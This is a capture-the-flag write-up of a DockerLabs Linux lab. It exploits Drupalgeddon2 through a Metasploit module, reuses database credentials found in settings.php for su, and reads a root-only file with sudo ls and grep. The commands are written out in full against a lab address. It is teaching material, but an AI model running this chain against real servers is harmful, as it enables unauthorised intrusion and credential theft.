---
title: 'DockerLabs: Ejotapete'
description: 'Drupalgeddon2 gives a foothold on a Drupal 8 site, database credentials in settings.php are reused for a local user, and a misconfigured sudo grep reads the root flag.'
pubDate: 2026-05-06
platform: 'DockerLabs'
category: 'Machine'
os: 'Linux'
difficulty: 'Easy'
retired: true
tags: ['dockerlabs', 'linux', 'web', 'drupal', 'metasploit', 'sudo', 'privesc']
---

## Overview

A short, linear box: identify the CMS, exploit a well-known Drupal RCE for a foothold,
loot reused credentials from the Drupal config, then abuse a loose `sudo` rule to read a
file we shouldn't be able to.

## Recon

I started by fingerprinting the web application with `whatweb`:

```bash
whatweb http://172.17.0.2/drupal/
```

![whatweb output showing Drupal 8](/images/writeups/ejotapete/whatweb.png)

The target runs **Drupal 8** on Apache 2.4.25 / PHP 7.2.3. Drupal 8 of that era is
squarely in Drupalgeddon2 territory, so I searched for matching exploits:

```bash
searchsploit drupal 8
```

![searchsploit results for Drupal](/images/writeups/ejotapete/searchsploit.png)

There are plenty of hits. The ones that matter here are the Drupalgeddon2 remote code
execution entries for Drupal `< 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1`:

![Drupalgeddon2 entries](/images/writeups/ejotapete/drupal8-exploits.png)

## Foothold — Drupalgeddon2

Rather than the standalone scripts, I used the Metasploit module:

```bash
msfconsole -q
search drupal 8
```

![Metasploit search for drupal modules](/images/writeups/ejotapete/msf-drupalgeddon2.png)

`exploit/unix/webapp/drupal_drupalgeddon2` is the one. Configure and run it:

```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 172.17.0.2
set TARGETURI /drupal
run
```

![Meterpreter session opened](/images/writeups/ejotapete/meterpreter.png)

The automatic check confirms the target is vulnerable and a Meterpreter session opens as
`www-data`. I dropped into a shell and upgraded it to a proper TTY:

```bash
script /dev/null -c bash
```

Looking around `/home`, there's a single user, **`ballenita`**:

![Listing /home shows the ballenita user](/images/writeups/ejotapete/users.png)

## Credential reuse via settings.php

Drupal keeps its database connection details in `sites/default/settings.php`. That file is
a reliable place to find credentials:

```bash
cat /var/www/html/drupal/sites/default/settings.php
```

![Database credentials in settings.php](/images/writeups/ejotapete/settings-php.png)

The `$databases` array holds a username and password in plaintext — and the admin even
left cheeky comments next to them:

```php
$databases['default']['default'] = array (
  'database' => 'database_under_beta_testing',
  'username' => 'ballenita',
  'password' => 'ballenitafeliz',
  ...
);
```

The database user shares a name with the local user, so it's worth trying the password for
a `su`:

```bash
su ballenita
# Password: ballenitafeliz
```

It works.

## Privilege escalation — sudo ls / grep

As `ballenita`, I checked the sudo rules:

```bash
sudo -l
```

![sudo -l output for ballenita](/images/writeups/ejotapete/sudo-l.png)

```
User ballenita may run the following commands on this host:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Two binaries as root with no password. Neither is a normal shell escape, but together they
are enough to read any file on the system. First, `sudo ls` to find the target:

```bash
sudo ls /root/
```

![sudo ls listing /root](/images/writeups/ejotapete/root-ls.png)

That reveals `secretitomaximo.txt`. Then `sudo grep` reads it — matching the empty pattern
prints every line:

```bash
sudo grep "" /root/secretitomaximo.txt
```

![Reading the root flag with sudo grep](/images/writeups/ejotapete/flag.png)

The root flag is recovered. Done.

## Lessons learned

- **An outdated CMS is a foothold waiting to happen.** Drupalgeddon2 (CVE-2018-7600) is a
  pre-auth RCE; a single version check led straight to a shell.
- **`settings.php` is a credential goldmine.** Database passwords stored there are often
  reused for local accounts — here `ballenita` / `ballenitafeliz` worked for both.
- **"Read-only" sudo binaries aren't harmless.** `ls` and `grep` as root have no obvious
  shell escape, but chaining them reads arbitrary files. Anything in a sudoers rule should
  be evaluated for what it can *read* and *write*, not just whether it spawns a shell —
  GTFOBins is the reference for this.
